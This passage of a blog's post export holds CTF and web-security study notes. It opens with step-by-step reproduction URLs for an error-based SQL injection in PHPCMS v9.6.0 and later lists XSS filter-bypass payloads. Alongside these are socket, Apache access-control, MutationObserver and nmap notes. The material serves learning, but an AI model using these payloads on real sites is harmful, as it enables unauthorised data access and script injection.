这里师傅们使用的生成这个加密后的$_POST[‘userid_flash’]的点在/phpcms/modules/wap/index.php文件中: function __construct() { $this-&gt;db = pc_base::load_model(&apos;content_model&apos;); $this-&gt;siteid = isset($_GET[&apos;siteid&apos;]) &amp;&amp; (intval($_GET[&apos;siteid&apos;]) &gt; 0) ? intval(trim($_GET[&apos;siteid&apos;])) : (param::get_cookie(&apos;siteid&apos;) ? param::get_cookie(&apos;siteid&apos;) : 1); param::set_cookie(&apos;siteid&apos;,$this-&gt;siteid); $this-&gt;wap_site = getcache(&apos;wap_site&apos;,&apos;wap&apos;); $this-&gt;types = getcache(&apos;wap_type&apos;,&apos;wap&apos;); $this-&gt;wap = $this-&gt;wap_site[$this-&gt;siteid]; define(&apos;WAP_SITEURL&apos;, $this-&gt;wap[&apos;domain&apos;] ? $this-&gt;wap[&apos;domain&apos;].&apos;index.php?&apos; : APP_PATH.&apos;index.php?m=wap&amp;siteid=&apos;.$this-&gt;siteid); if($this-&gt;wap[&apos;status&apos;]!=1) exit(L(&apos;wap_close_status&apos;)); } //展示首页 public function init() { $WAP = $this-&gt;wap; $TYPE = $this-&gt;types; $WAP_SETTING = string2array($WAP[&apos;setting&apos;]); $GLOBALS[&apos;siteid&apos;] = $siteid = max($this-&gt;siteid,1); $template = $WAP_SETTING[&apos;index_template&apos;] ? $WAP_SETTING[&apos;index_template&apos;] : &apos;index&apos;; include template(&apos;wap&apos;, $template); } 设置了一个siteid的cookie,可以利用这个cookie的值传入到之前的那个$_POST[‘userid_flash’]中. 0x03 注入验证Step1 获取之前的userid访问http://127.0.0.1/phpcms2/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1,获取cookie中的siteid值. Step2 获取加密后的sql语句访问http://127.0.0.1/phpcms2/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id%3d%25*27+and+updatexml(1,concat(0x7e,database()),0x7e)%23%26m%3d1%26f%3dhaha%26modelid%3d2%26catid%3d7%26&amp;,获取cookie中att_json值. Step3 执行注入访问http://127.0.0.1/phpcms2/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=加密后的字符串,即可验证. 0x04 参考文件 【挖坟】PHPCMS v9.6.0 SQL注入 PHPCMS V9.6.0注入分析 0x05 题外话比赛求各位大佬们轻虐!","categories":[{"name":"Ctf","slug":"Ctf","permalink":"https://hexo.imagemlt.xyz/categories/Ctf/"},{"name":"web","slug":"Ctf/web","permalink":"https://hexo.imagemlt.xyz/categories/Ctf/web/"},{"name":"技术学习","slug":"Ctf/web/技术学习","permalink":"https://hexo.imagemlt.xyz/categories/Ctf/web/技术学习/"}],"tags":[]},{"title":"socket网络编程笔记 与地址相关的常见struct","slug":"socket-structures","date":"2017-11-27T12:51:20.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/socket-structures/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/socket-structures/index.html","excerpt":"","text":"addrinfostruct addrinfo { int ai_flags; // AI_PASSIVE, AI_CANONNAME, etc. int ai_family; // AF_INET(ipv4), AF_INET6(ipv6), AF_UNSPEC int ai_socktype; // SOCK_STREAM, SOCK_DGRAM int ai_protocol; // use 0 for &quot;any&quot; size_t ai_addrlen; // size of ai_addr in bytes struct sockaddr *ai_addr; // struct sockaddr_in or _in6 char *ai_canonname; // full canonical hostname struct addrinfo *ai_next; // linked list, next node }; 获取此结构的函数:getaddrinfo() sockaddrstruct sockaddr { unsigned short sa_family; // address family, AF_xxx char sa_data[14]; // 14 bytes of protocol address,contains a destination address and port number for the socket. }; sockaddr_in// (IPv4 only--see struct sockaddr_in6 for IPv6) struct sockaddr_in { short int sin_family; // Address family, AF_INET unsigned short int sin_port; // Port number struct in_addr sin_addr; // Internet address unsigned char sin_zero[8]; // Same size as struct sockaddr }; sin_zero(which is included to pad the structure to the length of a struct sockaddr) should be set to all zeros with the function memset() sin_family corresponds to sa_family in a struct sockaddr and should be set to _AF_INET_. the sin_port must be in Network Byte Order (by using htons()!) in_addr// (IPv4 only--see struct in6_addr for IPv6) // Internet address (a structure for historical reasons) struct in_addr { uint32_t s_addr; // that&apos;s a 32-bit int (4 bytes) }; used to be a union referes to the 4-byte IP address structs in ipv6(similar)// (IPv6 only--see struct sockaddr_in and struct in_addr for IPv4) struct sockaddr_in6 { u_int16_t sin6_family; // address family, AF_INET6 u_int16_t sin6_port; // port number, Network Byte Order u_int32_t sin6_flowinfo; // IPv6 flow information struct in6_addr sin6_addr; // IPv6 address u_int32_t sin6_scope_id; // Scope ID }; struct in6_addr { unsigned char s6_addr[16]; // IPv6 address }; sockaddr_storage (a structure large enough to hold both ipv4 and ipv6 structrues)struct sockaddr_storage { sa_family_t ss_family; // address family // all this is padding, implementation specific, ignore it: char __ss_pad1[_SS_PAD1SIZE]; int64_t __ss_align; char __ss_pad2[_SS_PAD2SIZE]; }; you can cast it to a struct sockaddr_in or struct sockaddr_in6 if you wanna manipulate IP addressinet_pton(): cast string form to binary formstruct sockaddr_in sa; // IPv4 struct sockaddr_in6 sa6; // IPv6 inet_pton(AF_INET, &quot;10.12.110.57&quot;, &amp;(sa.sin_addr)); // IPv4 inet_pton(AF_INET6, &quot;2001:db8:63b3:1::3490&quot;, &amp;(sa6.sin6_addr)); // IPv6 old way: _inet_addr()_ _inet_aton()_ (not compatible with IPv6) inet_ntop(): cast binary from to string from// IPv4: char ip4[INET_ADDRSTRLEN]; struct sockaddr_in sa; // space to hold the IPv4 string // pretend this is loaded with something inet_ntop(AF_INET, &amp;(sa.sin_addr), ip4, INET_ADDRSTRLEN); printf(&quot;The IPv4 address is: %s\\n&quot;, ip4); // IPv6: char ip6[INET6_ADDRSTRLEN]; // space to hold the IPv6 string struct sockaddr_in6 sa6; // pretend this is loaded with something inet_ntop(AF_INET6, &amp;(sa6.sin6_addr), ip6, INET6_ADDRSTRLEN); printf(&quot;The address is: %s\\n&quot;, ip6); only work with numeric IP addresses,won’t do any nameserver DNS lookup on a hostname. Use getaddrinfo() to do that. Other Notes Layered Network Model Seven layers Application (应用层) Presentaion (表示层) Session (会话层) Transport (传输层) Network (网络层) Data Link (数据链路层) Physical (物理层) Simplified Four Layers Application Layer(应用层:telnet,ftp,etc.) Host-to-Host Layer(传输层:TCP UDP) Internet Layer(网络互连层:IP and routing) Network Access Layer(主机到网络层:Ethernet,wi-fi,whatever) Some common IP addresses 10.x.x.x only be used either of fully disconnected networks or the networks behind firewalls 192.168.x.x x in range(0,256) 172.y.x.x y in rarnge(16,32)","categories":[{"name":"技术学习","slug":"技术学习","permalink":"https://hexo.imagemlt.xyz/categories/技术学习/"}],"tags":[]},{"title":"天翼杯线下赛总结","slug":"tianyi6","date":"2017-10-27T00:19:41.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/tianyi6/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/tianyi6/index.html","excerpt":"","text":"昨天打了场天翼杯线下赛，也算是第二次打线下赛了吧，跟着学长们混最后拿到了个第五名。比赛还是让萌新受益匪浅，也充分了解到自己的不足之处。欸，菜的一笔还得继续努力。那就写这篇文章重点来记录一下自己参加这次线下赛的感想吧。 1.Windows服务器管理方面不擅长之前较少接触windows服务器，这次线下赛有一台装有struts的windows服务器，经检测确实存在struts2046漏洞可以利用。然而获取shell之后需要获取远程桌面才能得到flag，由于windows的cmd玩的不是很熟所以试了半天还是gg了。。。。。。所以以后还是要拓展知识面。 2.代码审计现场审计phpcms的漏洞，提前准备的一些POC由于没有仔细用过结果用的时候有的库没装。。。。试了半天也没试出来。。。。还是太菜了。。。。以后还是要多学学代码审计相关的知识，至少做到熟练一些主流cms的架构。 3.linux运维有些重要命令还是不熟。。。。。。以后还得多学学。。。。。。 总之个人认为线下赛还是对个人能力的全方位的考验，需要有扎实的功底和渗透运维技巧。菜的一笔。。。。还是去好好学习吧。。。。。。","categories":[{"name":"Ctf","slug":"Ctf","permalink":"https://hexo.imagemlt.xyz/categories/Ctf/"},{"name":"人生杂谈","slug":"Ctf/人生杂谈","permalink":"https://hexo.imagemlt.xyz/categories/Ctf/人生杂谈/"}],"tags":[]},{"title":"XSS","slug":"xss","date":"2017-08-27T04:08:09.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/xss/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/xss/index.html","excerpt":"","text":"整理sus沙龙以及xman的前端ppt的笔记 0x01 JS能用来做什么 请求资源 提交表单 修改html 响应事件 0x02 一个含有js的html文件是怎样变成一个动态网页的浏览器解析方式 在HTML中有五类元素 语言的解析一般分为词法分析（lexical analysis）和语法分析（Syntax analysis）两个阶段，WebKit中的 html解析也不例外，本文主要讨论词法分析。 词法分析的任务是对输入字节流进行逐字扫描，根据构词规则识别单词和符号，分词。 在WebKit中，有两个类，同词法分析密切相关，它是HTMLToken和HTMLTokenizer类，可以简单将HTMLToken类理 解 为标记，HTMLTokenizer类理解为词法解析器。HTML词法解析的任务，就是将输入的字节流解析成一个个的标记（HTMLToken），然后由 语法解析器进行下一步的分析。 \\ 在XML/HTML的文档解析中，token这个词经常用到，我将其理解为一个有完整语义的单元（也就是分出来的 “词”），一个元素通常对应于3 个 token，一个是元素的起始标签，一个是元素的结束标签，一个是元素的内容，这点同DOM树是不一样的，在DOM树上，起始标签和结束标签对应于一个元素节点，而元素内容对应另一个节点。 * 除了起始标签(StartTag)、结束标签(EndTag)和元素内容（Character），HTML标签还有DOCTYPE（文档类 型）,Comment（注释），Uninitialized（默认类型）和EndOfFile（文档结束）等类型，参见HTMLToken.h中的 Type枚举 在HTML中有五类元素： 空元素(Void elements)，如&lt;area&gt;,&lt;br&gt;,&lt;base&gt;等等 原始文本元素(Raw text elements)，有&lt;script&gt;和&lt;style&gt; RCDATA元素(RCDATA elements)，有&lt;textarea&gt;和&lt;title&gt; 外部元素(Foreign elements)，例如MathML命名空间或者SVG命名空间的元素 基本元素(Normal elements)，即除了以上4种元素以外的元素 五类元素的区别如下： 空元素，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。 原始文本元素，可以容纳文本。 RCDATA元素，可以容纳文本和字符引用。 （&amp;#60） 外部元素，可以容纳文本、字符引用、CDATA段、其他元素和注释 基本元素，可以容纳文本、字符引用、其他元素和注释 如果我们回头看HTML解析器的规则，其中有一种可以容纳字符引用的情况是“RCDATA状态中的字符引用”。 这意味着在&lt;textarea&gt;和&lt;title&gt;标签中的字符引用会被HTML解析器解码。这里要再提醒一次，在解析这些字符 引用的过程中不会进入“标签开始状态”。这样就可以解释问题5了。另外，对RCDATA有个特殊的情况。在浏 览器解析RCDATA元素的过程中，解析器会进入RCDATA状态。在这个状态中，如果遇到&lt;字符，它会转 换到RCDATA小于号状态。如果&lt;字符后没有紧跟着/和对应的标签名，解析器会转换回RCDATA状 态。这意味着在RCDATA元素标签的内容中（例如&lt;textarea&gt;或&lt;title&gt;的内容中），唯一能够被解析器认做是 标签的就是&lt;/textarea&gt;或者&lt;/title&gt;。当然，这要看开始标签是哪一个。因此，在&lt;textarea&gt;和&lt;title&gt;”的内容中不会创建标签，就不会有脚本能够执行。 0x03 XSS是什么恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的.通过xss可以进行一系列的越权操作，或者窃取用户cookies从而登录用户账户。 说白了就是 插js, html耍流氓 0x04 XSS的分类反射型XSS： 恶意代码通常存在于URL中 需要用户去点击相应的链接才会触发，隐蔽性较差 而且，而且可能会被浏览器的XSS Filter干掉 流程：输入–输出 存储型XSS： 恶意代码通常存在于数据库中 用户浏览被植入payload的“正常页面”时即可触发，隐蔽性较 强，成功率高，稳定性好。 流程：输入–进入数据库–取出数据库–输出 0x05 XSS漏洞挖掘技巧 输入在标签间的情况：测试&lt;&gt;是否被过滤或转义，若无则直接&lt;img src=1 onerror=alert(1)&gt; 输入在script标签内：我们需要在保证内部JS语法正确的前提下，去插入我们的payload。 如果我们的输出在字符串内部，测试字符串能否被闭合。如果我 们无法闭合包裹字符串的引号，这个点就很难利用了。 可能的解决方案：可以控制两处输入且\\可用、存在宽字节 输入在HTML属性内：首先查看属性是否有双引号包裹、没有则直接添加新的事件属性； 有双引号包裹则测试双引号是否可用，可用则闭合属性之后添加 新的事件属性； TIP：HTML的属性，如果被进行HTML实体编码(形如&amp;#039;&amp;#x27)，那么 HTML会对其进行自动解码，从而我们可以在属性里以HTML实体编 码的方式引入任意字符，从而方便我们在事件属性里以JS的方式构 造payload。 输出在JS中，空格被过滤：使用/**/代替空格。 输出在JS注释中： 设法插入换行符%0A，使其逃逸出来。 输入在JS字符串内： 可以利用JS的十六进制、八进制、unicode编码。 输入在src/href/action等属性内：可以利用javascript:alert(1)，以及 data:text/html;base64;加上base64编码后的HTML。 onxxx事件的js脚本可以用html编码来绕过对某些关键字的过滤。 Chrome下iframe自身的弹框姿势：123456789101112131415 &lt;iframe onload=\"alert(1)\"&gt;&lt;/iframe&gt; &lt;iframe src=\"javascript:alert(2)\"&gt;&lt;/iframe&gt; &lt;iframe src=\"data:text/html,&lt;script&gt;alert(3)&lt;/script&gt;\"&gt;&lt;/iframe&gt; &lt;iframe srcdoc=\"&lt;script&gt;alert(4)&lt;/script&gt;\"&gt;&lt;/iframe&gt;``` * 坑点之自带HtmlEncode(转义)功能的标签：```html &lt;textarea&gt;&lt;/textarea&gt; &lt;title&gt;&lt;/title&gt; &lt;iframe&gt;&lt;/iframe&gt; &lt;noscript&gt;&lt;/noscript&gt; &lt;noframes&gt;&lt;/noframes&gt; &lt;xmp&gt;&lt;/xmp&gt; &lt;plaintext&gt;&lt;/plaintext&gt; 当我们的XSS payload位于这些标签中间时，并不会解析，除非我们把它们闭合掉。 0x06 XSS练习网站、资料 xss-quiz alert(1) to win prompt(1) to win html5 Security Cheatsheet XSS Cheatsheet OWASP XSS Filter Evasion Cheat Sheet","categories":[{"name":"人生杂谈","slug":"人生杂谈","permalink":"https://hexo.imagemlt.xyz/categories/人生杂谈/"}],"tags":[]},{"title":"Apache Order Allow","slug":"apache-order-allow","date":"2017-08-11T10:02:02.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/apache-order-allow/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/apache-order-allow/index.html","excerpt":"","text":"Allow和Deny可以用于apache的conf文件或者.htaccess文件中（配合Directory, Location, Files等），用来控制目录和文件的访问授权。 \u0000 \u0000所以，最常用的是： Order Deny,Allow Allow from All 注意“Deny,Allow”中间只有一个逗号，也只能有一个逗号，有空格都会出错；单词的大小写不限。上面设定的含义是先设定“先检查禁止设定，没有禁止的全部允许”，而第二句没有Deny，也就是没有禁止访问的设定，直接就是允许所有访问了。这个主要是用来确保或者覆盖上级目录的设置，开放所有内容的访问权。 按照上面的解释，下面的设定是无条件禁止访问： Order Allow,Deny Deny from All 如果要禁止部分内容的访问，其他的全部开放： Order Deny,Allow Deny from ip1 ip2 或者 Order Allow,Deny Allow from all Deny from ip1 ip2 apache会按照order决定最后使用哪一条规则，比如上面的第二种方式，虽然第二句allow允许了访问，但由于在order中allow不是最后规则，因此还需要看有没有deny规则，于是到了第三句，符合ip1和ip2的访问就被禁止了。注意，order决定的“最后”规则非常重要，下面是两个错误的例子和改正方式： Order Deny,Allow Allow from all Deny from domain.org 错误：想禁止来自domain.org的访问，但是deny不是最后规则，apache在处理到第二句allow的时候就已经匹配成功，根本就不会去看第三句。 解决方法：Order Allow,Deny，后面两句不动，即可。 Order Allow,Deny Allow from ip1 Deny from all 错误：想只允许来自ip1的访问，但是，虽然第二句中设定了allow规则，由于order中deny在后，所以会以第三句deny为准，而第三句的范围中又明显包含了ip1（all include ip1），所以所有的访问都被禁止了。 解决方法一：直接去掉第三句。 解决方法二： Order Deny,Allow Deny from all Allow from ip1 下面是测试过的例子： ——————————– Order deny,allow allow from all deny from 219.204.253.8 #全部都可以通行 ——————————- Order deny,allow deny from 219.204.253.8 allow from all #全部都可以通行 ——————————- Order allow,deny deny from 219.204.253.8 allow from all #只有219.204.253.8不能通行 ——————————- Order allow,deny allow from all deny from 219.204.253.8 #只有219.204.253.8不能通行 ——————————- ——————————- Order allow,deny deny from all allow from 219.204.253.8 #全部都不能通行 ——————————- Order allow,deny allow from 219.204.253.8 deny from all #全部都不能通行 ——————————- Order deny,allow allow from 219.204.253.8 deny from all #只允许219.204.253.8通行 ——————————- Order deny,allow deny from all allow from 219.204.253.8 #只允许219.204.253.8通行 ——————————- ——————————– Order deny,allow #全部都可以通行（默认的） ——————————- Order allow,deny #全部都不能通行（默认的） ——————————- Order allow,deny deny from all #全部都不能通行 ——————————- Order deny,allow deny from all #全部都不能通行 ——————————- 对于上面两种情况，如果换成allow from all，则全部都可以通行！ ——————————- Order deny,allow deny from 219.204.253.8 #只有219.204.253.8不能通行 ——————————- Order allow,deny deny from 219.204.253.8 #全部都不能通行 ——————————- Order allow,deny allow from 219.204.253.8 #只允许219.204.253.8通行 ——————————- Order deny,allow allow from 219.204.253.8 #全部都可以通行 ——————————- ——————————- order deny,allow allow from 218.20.253.2 deny from 218.20 #代表拒绝218.20开头的IP，但允许218.20.253.2通过；而其它非218.20开头的IP也都允许通过。 ——————————- order allow,deny allow from 218.20.253.2 deny from 218.20 #和上面的差不多，只是掉换的order语句中的allow、deny先后顺序，但最终结果表示全部都拒绝！ \u0000 \u0000form:http://hi.baidu.com/enjoypain/blog/item/f48c7aecdba298d12f2e21ac.html \u0000 \u0000前段时间做了个Apache的HTTP代理服务器，其中的order allow，deny这部分弄的不太懂，于是上网找资料看，谁知道越看越糊涂，其中有些难以分辨对错甚至是误导。就像破解windows系统密码的一些文章那样，很多都是人云亦云的，并没有经过测试。废话少说，先把我经过测试后分析总结出来的结论show出来，相信这对大家的理解非常有帮助。 总则—— 影响最终判断结果的只有两点： 1. order语句中allow、deny的先后顺序； 2. allow、deny语句中各自包含的范围。 温馨提醒—— 1. 修改完配置后要保存好并重启Apache服务，配置才能生效； 2. 开头字母不分大小写； 3. allow、deny语句不分先后顺序，谁先谁后不影响最终判断结果；但都会被判断到； 4. order语句中，“allow,deny”之间“有且只有”一个逗号（英文格式的），而且先后顺序很重要； 5. Apache有一条缺省规则，“order allow,deny”本身就默认了拒绝所有的意思，因为deny在allow的后面；同理，“order deny,allow”本身默认的是允许所有；当然，最终判断结果还要综合下面的allow、deny语句中各自所包含的范围；（也就是说order语句后面可以没有allow、deny语句） 6. allow、deny语句中，第二个单词一定是“from”，否则Apache会因错而无法启动， 7. “order allow,deny”代表先判断allow语句再判断deny语句，反之亦然。 上面说的都是要记住的，而下面说的是我独创的理解方法。如果有人看了而没有豁然开朗的感觉，那算是我的失败！ 判断原则分4步走—— 1. 首先判断默认的； 2. 然后判断逗号前的； 3. 最后判断逗号后的； 4. 最终按顺序叠加而得出判断结果。 上面三点我说的简单而形象，主要是为了便于记忆。暂时不理解不要紧，继续看下面详细的解说自然会明白。下面以一个普通例子来做解释—— order deny,allow allow from 218.20.253.2 deny from 218.20 1. 所谓“首先判断默认的”，就是判断“order deny,allow”这句，它默认是允许所有； 2. 所谓“然后判断逗号前的”，因为在本例子中的order语句里面，deny在逗号的前面，所以现在轮到判断下面的deny语句了——“deny from 218.20”； 3. 所谓“最后判断逗号后的”，因为在本例子中的order语句里面，allow在逗号的后面，所以最后轮到判断下面的allow语句了——“allow from 218.20.253.2”。 4. 所谓“最终按顺序叠加而得出判断结果”，这是一个形象化了的说法，我把每一步判断都看作一个“不透明的图层”，然后一步步按顺序叠加上去，最终得出的“图像”就是判断结果。 用过作图软件的人应该都知道“图层”是怎么回事，我估计Apache关于order allow deny这方面的设计理念和photoshop等作图软件关于图层的设计理念是一样的。即“游戏规则”是一样的。 那么上面的例子就可以是这么一个步骤和图像—— 1. 先画一个白色的大圆，代表“order deny,allow”语句，默认意思是允许所有； 2. 然后画一个小一点的黑色圆，代表“deny from 218.20”语句，意思是拒绝所有以218.20开头的IP，放进白色的大圆里面； 3. 最后再画一个白色的圆，代表“allow from 218.20.253.2”语句，意思是允许218.20.253.2通过，放在黑色圆的上面。 4. 到此为止，我们已经可以看到一个结果了，白色大圆上面有一个黑色圆，黑色圆上面还有一个白色圆。最后，我们所能看到的黑色部分就是拒绝通行的，剩下的白色部分都是允许通行的。判断的结果就是这么简单形象！ 如果不懂的用作图软件，我们再来个非常贴近生活的比喻—— 把上面的例子改动一点点，以便更好的理解： order deny,allow allow from 218.20.253.2 deny from 219.30 1. 首先拿一张A4白纸，代表第order语句，意思是允许全部； 2. 然后拿一张黑色纸剪一个圆，放在A4纸里面的某个位置上，代表deny语句，意思是拒绝所有以219.30开头的IP； 3. 最后拿白纸再剪一个圆，放在黑色圆的旁边，代表allow语句，意思是允许218.20.253.2通过；注意，这个例子不是放进黑色圆里面了，因为deny和allow语句不再有相互包含的关系了。 4. A4纸上面有一个黑色圆和一个白色圆，结果自然很明显了。不过白色的A4纸上再放一个白色的圆，显然是多余的了，因为大家都是白色的，都代表允许，所以就重复了，可以去掉白色的圆而不会影响判断结果。 如果看到这里还没明白，那一定是我还有什么没说清楚的。那么请好好分析我所做过的测试例子，将在最后列出来。 在这里再啰嗦一下，allow、deny语句后面跟的参数有多种形式，有不同的表达方式，我在网上看到的做法是deny from IP1 IP2 IP3或allow from domain.com等。其它的表达方式大家再找别的资料看吧。我想说的是另一种表达方式： order deny,allow allow from IP1 IP2 allow from domain.info allow from 219.20.55.0/24 deny from all 我没具体验证过这是否对，不过这样是可以正常启动Apache服务的，按道理应该是正确的表达方式。哈哈，像我这样的入门者只能这样了，还希望大家多多指教！ 下面是测试过的例子： ——————————– Order deny,allow allow from all deny from 219.204.253.8 #全部都可以通行 ——————————- Order deny,allow deny from 219.204.253.8 allow from all #全部都可以通行 ——————————- Order allow,deny deny from 219.204.253.8 allow from all #只有219.204.253.8不能通行 ——————————- Order allow,deny allow from all deny from 219.204.253.8 #只有219.204.253.8不能通行 ——————————- ——————————- Order allow,deny deny from all allow from 219.204.253.8 #全部都不能通行 ——————————- Order allow,deny allow from 219.204.253.8 deny from all #全部都不能通行 ——————————- Order deny,allow allow from 219.204.253.8 deny from all #只允许219.204.253.8通行 ——————————- Order deny,allow deny from all allow from 219.204.253.8 #只允许219.204.253.8通行 ——————————- ——————————– Order deny,allow #全部都可以通行（默认的） ——————————- Order allow,deny #全部都不能通行（默认的） ——————————- Order allow,deny deny from all #全部都不能通行 ——————————- Order deny,allow deny from all #全部都不能通行 ——————————- 对于上面两种情况，如果换成allow from all，则全部都可以通行！ ——————————- Order deny,allow deny from 219.204.253.8 #只有219.204.253.8不能通行 ——————————- Order allow,deny deny from 219.204.253.8 #全部都不能通行 ——————————- Order allow,deny allow from 219.204.253.8 #只允许219.204.253.8通行 ——————————- Order deny,allow allow from 219.204.253.8 #全部都可以通行 ——————————- ——————————- order deny,allow allow from 218.20.253.2 deny from 218.20 #代表拒绝218.20开头的IP，但允许218.20.253.2通过；而其它非218.20开头的IP也都允许通过。 ——————————- order allow,deny allow from 218.20.253.2 deny from 218.20 #和上面的差不多，只是掉换的order语句中的allow、deny先后顺序，但最终结果表示全部都拒绝！ \u0000","categories":[{"name":"人生杂谈","slug":"人生杂谈","permalink":"https://hexo.imagemlt.xyz/categories/人生杂谈/"}],"tags":[]},{"title":"html5新特性: MutationObeserver","slug":"html5-mutation-observer-2","date":"2017-08-10T16:43:56.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/html5-mutation-observer-2/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/html5-mutation-observer-2/index.html","excerpt":"","text":"帮一哥们儿搞node-red的前端，需要实时获取node-red数据并在canvas上做相应的绘图工作，几番百度之后百度到了Mutation-Observer这样一个神奇的新特性。因此引用一下别的表哥写的关于MutationObserver的使用说明作为以后的参考。转自：http://www.cnblogs.com/jscode/p/3600060.html 1、概述Mutation Observer（变动观察器）是监视DOM变动的接口。当DOM对象树发生任何变动时，Mutation Observer会得到通知。 要概念上，它很接近事件。可以理解为，当DOM发生变动会触发Mutation Observer事件。但是，它与事件有一个本质不同：事件是同步触发，也就是说DOM发生变动立刻会触发相应的事件；Mutation Observer则是异步触发，DOM发生变动以后，并不会马上触发，而是要等到当前所有DOM操作都结束后才触发。 这样设计是为了应付DOM变动频繁的情况。举例来说，如果在文档中连续插入1000个段落（p元素），会连续触发1000个插入事件，执行每个事件的回调函数，这很可能造成浏览器的卡顿；而Mutation Observer完全不同，只在1000个段落都插入结束后才会触发，而且只触发一次。 Mutation Observer有以下特点： 它等待所有脚本任务完成后，才会运行，即采用异步方式 它把DOM变动记录封装成一个数组进行处理，而不是一条条地个别处理DOM变动。 它即可以观察发生在DOM节点的所有变动，也可以观察某一类变动 目前，Firefox(14+)、Chrome(26+)、Opera(15+)、IE(11+)和Safari(6.1+)支持这个API。Safari 6.0和Chrome 18-25使用这个API的时候，需要加上WebKit前缀（WebKitMutationObserver）。可以使用下面的表达式检查浏览器是否支持这个API。 var MutationObserver = window.MutationObserver || window.WebKitMutationObserver || window.MozMutationObserver; var mutationObserverSupport = !!MutationObserver; 2、使用方法首先，使用MutationObserver构造函数，新建一个实例，同时指定这个实例的回调函数。 var observer = new MutationObserver(callback); 2.1 observer方法observer方法指定所要观察的DOM元素，以及要观察的特定变动。 var article = document.querySelector(‘article’); var options = { ‘childList’: true, ‘arrtibutes’: true}; observer.observer(article, options); 上面代码首先指定，所要观察的DOM元素提article，然后指定所要观察的变动是子元素的变动和属性变动。最后，将这两个限定条件作为参数，传入observer对象的observer方法。 MutationObserver所观察的DOM变动（即上面代码的option对象），包含以下类型： childList：子元素的变动 attributes：属性的变动 characterData：节点内容或节点文本的变动 subtree：所有下属节点（包括子节点和子节点的子节点）的变动 想要观察哪一种变动类型，就在option对象中指定它的值为true。需要注意的是，不能单独观察subtree变动，必须同时指定childList、attributes和characterData中的一种或多种。 除了变动类型，option对象还可以设定以下属性： attributeOldValue：值为true或者为false。如果为true，则表示需要记录变动前的属性值。 characterDataOldValue：值为true或者为false。如果为true，则表示需要记录变动前的数据值。 attributesFilter：值为一个数组，表示需要观察的特定属性（比如[‘class’, ‘str’]）。 2.2 disconnect方法和takeRecord方法disconnect方法用来停止观察。发生相应变动时，不再调用回调函数。 observer.disconnect(); takeRecord方法用来清除变动记录，即不再处理未处理的变动。 observer.takeRecord 2.3 MutationRecord对象DOM对象每次发生变化，就会生成一条变动记录。这个变动记录对应一个MutationRecord对象，该对象包含了与变动相关的所有信息。Mutation Observer进行处理的一个个变动对象所组成的数组。 MutationRecord对象包含了DOM的相关信息，有如下属性： type:观察的变动类型（attribute、characterData或者childList）。 target:发生变动的DOM对象。 addedNodes:新增的DOM对象。 removeNodes:删除的DOM对象。 previousSibling:前一个同级的DOM对象，如果没有则返回null。 nextSibling:下一个同级的DOM对象，如果没有就返回null。 attributeName:发生变动的属性。如果设置了attributeFilter，则只返回预先指定的属性。 oldValue:变动前的值。这个属性只对attribute和characterData变动有效，如果发生childList变动，则返回null。 3、实例3.1 子元素的变动下面的例子说明如果读取变动记录。 var callback = function(records) { records.map(function(record) { console.log(‘Mutation type: ‘ + record.type); console.log(‘Mutation target: ‘ + record.target); });}; var mo = new MutationObserver(callback); var option = { ‘childList’: true, ‘subtree’: true}; mo.observer(document.body, option); 上面代码的观察器，观察body元素的所有下级元素（childList表示观察子元素，subtree表示观察子元素的下级元素）的变动。回调函数会在控制台显示所有变动的类型和目标元素。 3.2、属性的变动下面的例子说明如何追踪属性的变动。 var callback = function(records) { records.map(function(record) { console.log(‘Previous attribute value: ‘ + record.oldValue); });}; var mo = new MutationObserver(callback); var element = document.getElementById(‘#my_element’); var option = { ‘attribute’: true, ‘attributeOldValue’: true}; mo.observer(element, option); 上面代码先设定追踪属性变动（’attributes’: true），然后设定记录变动前的值。实际发生变动时，会将变动前的值显示在控制台。 4、参考链接[1] Tiffany Brown, Getting to know mutation observers [2] Michal Budzynski, JavaScript: The less know parts.DOM Mutations [3] Jeff Griffiths, DOM MutationObserver - reacting to DOM changes without killing browser performance [4] Ruanyf, Mutation Observer","categories":[{"name":"技术学习","slug":"技术学习","permalink":"https://hexo.imagemlt.xyz/categories/技术学习/"}],"tags":[]},{"title":"不老的神器：安全扫描器Nmap渗透使用指南","slug":"nmapguide","date":"2017-07-29T05:15:48.000Z","updated":"2019-02-02T00:29:25.000Z","comments":true,"path":"post/nmapguide/index.html","link":"","permalink":"https://hexo.imagemlt.xyz/post/nmapguide/index.html","excerpt":"","text":"*本文原创作者：国光，属于FreeBuf原创奖励计划，转载请注明FreeBuf.COM 介绍 nmap是用来探测计算机网络上的主机和服务的一种安全扫描器。为了绘制网络拓扑图Nmap的发送特制的数据包到目标主机然后对返回数据包进行分析。Nmap是一款枚举和测试网络的强大工具。 特点 主机探测 端口扫描 版本检测 支持探测脚本的编写 安装 官网:http://nmap.org 图形化:Zenmap 基本操作 基本快速扫描 Nmap 默认发送一个arp的ping数据包来探测目标主机在1-10000范围内所开放的端口。 nmap 10.130.1.43 一款强大的安全扫描器nmap：不老的神器 快速扫描多个目标 nmap nmap 10.130.1.28 10.130.1.43 一款强大的安全扫描器nmap：不老的神器 详细描述输出扫描 简单扫描并对返回的结果详细描述输出,这个扫描是可以看到扫描的过程的,漫长的扫描的过程中可以看到百分比 就不会显得那么枯燥而且可以提升逼格。 nmap -vv 10.1.1.254 一款强大的安全扫描器nmap：不老的神器 亲测,-v和-vv扫描几乎是一样都都是列出了详细的扫描过程。 指定端口和范围扫描 nmap 默认扫描目标1-10000范围内的端口号。我们则可以通过参数-p 来设置我们将要扫描的端口号 nmap -p(range) namp -p3389,20-100 10.130.1.43 